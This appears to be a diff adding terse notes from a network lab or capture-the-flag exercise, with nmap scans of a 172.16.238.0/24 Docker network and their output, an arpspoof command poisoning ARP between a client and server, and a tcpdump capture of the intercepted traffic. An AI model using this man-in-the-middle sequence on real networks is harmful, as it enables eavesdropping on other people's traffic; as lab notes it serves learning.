@@ -1,0 +1,110 @@
+cat /proc/net/fib_trie
+
+found 172.16.238.0/24
+
+nmap -sT 172.16.238.0/24
+
+get 4 host
+///////////////////////
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-27 15:59 UTC
+Nmap scan report for 172.16.238.1
+Host is up (0.00014s latency).
+Not shown: 997 closed ports
+PORT     STATE    SERVICE
+22/tcp   open     ssh
+80/tcp   filtered http
+2222/tcp filtered EtherNetIP-1
+
+Nmap scan report for ubuntu_server-in_1.ubuntu_local-net (172.16.238.2)
+Host is up (0.00072s latency).
+All 1000 scanned ports on ubuntu_server-in_1.ubuntu_local-net (172.16.238.2) are closed
+
+Nmap scan report for 2d9cadf1ebc0 (172.16.238.3)
+Host is up (0.00069s latency).
+Not shown: 999 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+
+Nmap scan report for ubuntu_client_1.ubuntu_local-net (172.16.238.4)
+Host is up (0.00059s latency).
+All 1000 scanned ports on ubuntu_client_1.ubuntu_local-net (172.16.238.4) are closed
+
+Nmap done: 256 IP addresses (4 hosts up) scanned in 17.35 seconds
+///////////////////////
+
+show all interfaces
+tcpdump -D
+
+
+arpspoof -i eth1 -t 172.16.238.4 -r 172.16.238.2 >/dev/null 2>&1&
+
+
+
+nmap -A -p- 172.16.238.0/24
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2020-08-28 12:52 UTC
+Nmap scan report for 172.16.238.1
+Host is up (0.00014s latency).
+Not shown: 65532 closed ports
+PORT     STATE    SERVICE      VERSION
+22/tcp   open     ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 b4:5e:6d:f5:c3:f3:51:c0:39:f1:c8:52:bc:75:89:c7 (RSA)
+|   256 24:b3:f2:fa:e4:7d:80:9a:bf:ba:26:62:79:aa:16:3c (ECDSA)
+|_  256 30:46:30:a3:18:8a:6d:d8:d2:e2:3d:ee:8e:26:18:89 (EdDSA)
+80/tcp   filtered http
+2222/tcp filtered EtherNetIP-1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for ubuntu_server-in_1.ubuntu_local-net (172.16.238.2)
+Host is up (0.00049s latency).
+Not shown: 65534 closed ports
+PORT     STATE SERVICE VERSION
+1337/tcp open  waste?
+| fingerprint-strings: 
+|   GenericLines, Help, JavaRMI, LPDString, NULL, TerminalServer, X11Probe: 
+|_    3vD|
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port1337-TCP:V=7.60%I=7%D=8/28%Time=5F48FE3D%P=x86_64-pc-linux-gnu%r(NU
+SF:LL,20,"Yn\+\0\xb3I\xe7\x8d\xe0\xccXnE\x82\xc8\xd7\x0e`'\xf7j\xf0\"\r\xa
+SF:7\xa3\x1e3vD\|\xbb")%r(GenericLines,20,"Yn\+\0\xb3I\xe7\x8d\xe0\xccXnE\
+SF:x82\xc8\xd7\x0e`'\xf7j\xf0\"\r\xa7\xa3\x1e3vD\|\xbb")%r(Help,20,"Yn\+\0
+SF:\xb3I\xe7\x8d\xe0\xccXnE\x82\xc8\xd7\x0e`'\xf7j\xf0\"\r\xa7\xa3\x1e3vD\
+SF:|\xbb")%r(X11Probe,20,"Yn\+\0\xb3I\xe7\x8d\xe0\xccXnE\x82\xc8\xd7\x0e`'
+SF:\xf7j\xf0\"\r\xa7\xa3\x1e3vD\|\xbb")%r(LPDString,20,"Yn\+\0\xb3I\xe7\x8
+SF:d\xe0\xccXnE\x82\xc8\xd7\x0e`'\xf7j\xf0\"\r\xa7\xa3\x1e3vD\|\xbb")%r(Te
+SF:rminalServer,20,"Yn\+\0\xb3I\xe7\x8d\xe0\xccXnE\x82\xc8\xd7\x0e`'\xf7j\
+SF:xf0\"\r\xa7\xa3\x1e3vD\|\xbb")%r(JavaRMI,20,"Yn\+\0\xb3I\xe7\x8d\xe0\xc
+SF:cXnE\x82\xc8\xd7\x0e`'\xf7j\xf0\"\r\xa7\xa3\x1e3vD\|\xbb");
+
+Nmap scan report for 2d9cadf1ebc0 (172.16.238.3)
+Host is up (0.00067s latency).
+Not shown: 65534 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 d5:5c:f4:2b:d2:ea:1e:10:19:76:52:3c:e4:9f:7c:d0 (RSA)
+|   256 48:d1:c1:cf:a0:7d:8b:c0:66:c1:be:d0:fe:d3:d4:e8 (ECDSA)
+|_  256 14:9c:79:ac:40:2a:08:3e:08:bf:ae:59:a0:a6:13:92 (EdDSA)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Nmap scan report for ubuntu_client_1.ubuntu_local-net (172.16.238.4)
+Host is up (0.00094s latency).
+All 65535 scanned ports on ubuntu_client_1.ubuntu_local-net (172.16.238.4) are closed
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 256 IP addresses (4 hosts up) scanned in 62.39 seconds
+
+
+
+move to /dev/shm
+
+tcpdump -i eth1 -A -ne not arp -w capture.pcap -c 50
+
+follow tcp stream
+
+view as RAW
+
+
+
+
